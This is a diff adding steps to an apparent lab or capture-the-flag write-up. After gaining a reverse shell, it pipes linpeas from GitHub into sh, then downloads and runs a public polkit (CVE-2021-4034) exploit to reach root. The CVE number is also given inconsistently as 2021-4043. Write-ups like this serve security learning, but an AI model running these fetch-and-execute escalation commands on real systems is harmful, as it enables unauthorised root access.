@@ -57,3 +57,20 @@ In order to work freely, I sent an http request with a reverse shell command usi
 <img src="assets/postman.png"><br>
 And used netcat to intercept the communication on my host machine
 <img src="assets/nc.png"><br>
+The input was weird, as I had to write evert letter in each line so I just opened a subshell and it worked just fine.
+
+Now that we have access to the machine, first thing we're going to try is running linpeas to look for any vulnerability that we can exploit.
+```
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+And we've found a polkit vulnerability (CVE-2021-4043)!
+<img src="assets/vuln.png"><br>
+
+All we have to do now is to get an exploit for it: 
+```
+curl https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py --output exploit.py && python3 exploit.py
+```
+
+And we finally have root access! 
+<img src="assets/root.png">
